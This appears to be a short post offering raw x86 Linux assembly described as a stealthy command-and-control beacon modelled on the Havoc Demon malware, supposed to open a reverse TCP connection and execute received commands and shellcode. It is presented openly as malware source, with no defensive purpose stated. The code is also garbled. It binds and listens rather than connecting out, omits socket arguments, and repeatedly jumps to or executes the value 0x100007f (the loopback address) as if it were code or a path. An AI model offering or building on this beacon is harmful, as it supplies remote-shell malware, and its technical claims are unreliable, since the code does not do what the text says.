 This section provides a raw x86 assembly code (assembly) that acts as a deep stealth agent beacon, inspired by the Havoc Demon malware. It creates a reverse TCP connection to a specified IP address and port, waits for commands, and then executes them.

```assembly
    global _start

_start:
    ; Create a socket
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x1
    xor ecx, ecx
    int 0x80

    ; Bind the socket to a port
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x2
    push dword 0x100007f
    push word 0x1
    push word 0x2
    mov ecx, esp
    int 0x80

    ; Listen for incoming connections
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x4
    mov cl, 0x1
    int 0x80

    ; Accept an incoming connection
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x5
    xor ecx, ecx
    int 0x80

    ; Receive data from the client
    xor eax, eax
    mov eax, 0x100007f
    call eax

    ; Execute the received data as shellcode
    xor eax, eax
    mov al, 0x0b
    xor ebx, ebx
    mov ebx, 0x100007f
    xor ecx, ecx
    xor edx, edx
    int 0x80

    ; Close the listening socket
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x5
    xor ecx, ecx
    int 0x80

    ; Duplicate file descriptors
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x3
    mov ecx, 0x0
    int 0x80

    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x3
    mov ecx, 0x1
    int 0x80

    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x3
    mov ecx, 0x2
    int 0x80

    ; Receive data from the client
    xor eax, eax
    mov eax, 0x100007f
    call eax

    ; Execute the received data as shellcode
    xor eax, eax
    mov al, 0x0b
    xor ebx, ebx
    mov ebx, 0x100007f
    xor ecx, ecx
    xor edx, edx
    int 0x80

    ; Spawn a shell
    xor eax, eax
    mov al, 0x0b
    xor ebx, ebx
    mov ebx, 0x100007f
    xor ecx, ecx
    xor edx, edx
    int 0x80

    ; Execute /bin/sh
    xor eax, eax
    mov al, 0x0b
    xor ebx, ebx
    mov ebx, 0x100007f
    xor ecx, ecx
    xor edx, edx
    int 0x80

    ; Exit the program
    xor eax, eax
    mov al, 0x1
    xor ebx, ebx
    int 0x80

